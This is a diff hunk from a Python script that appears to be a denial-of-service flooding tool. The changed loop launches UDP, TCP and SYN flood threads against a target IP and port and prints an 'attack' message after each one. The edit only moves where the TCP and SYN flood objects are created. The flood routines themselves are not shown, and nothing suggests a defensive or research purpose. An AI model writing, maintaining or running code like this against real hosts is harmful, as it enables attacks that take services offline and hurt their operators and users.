@@ -104,12 +104,12 @@ while True:
         if size > 65507:
             sys.exit("Invalid Number Of Packets!")
         u = udp(ip,port,size,packets)
-        t = tcp(ip,port,size,packets)
-        s = syn(ip,port,packets)
         u.start()
         print("\033[33m[\033[1m+\033[33m]\033[92mRequest " +str()+ "  \033[33mto Sent attack \033[97m " +ip+ " \033[0m" )
+        t = tcp(ip,port,size,packets)
         t.start()
         print("\033[33m[\033[1m+\033[33m]\033[92mRequest " +str()+ "  \033[33mto Sent attack \033[97m " +ip+ " \033[0m" )
+        s = syn(ip,port,packets)
         s.start()
         print("\033[33m[\033[1m+\033[33m]\033[92mRequest " +str()+ "  \033[33mto Sent attack \033[97m " +ip+ " \033[0m" )
     except KeyboardInterrupt:
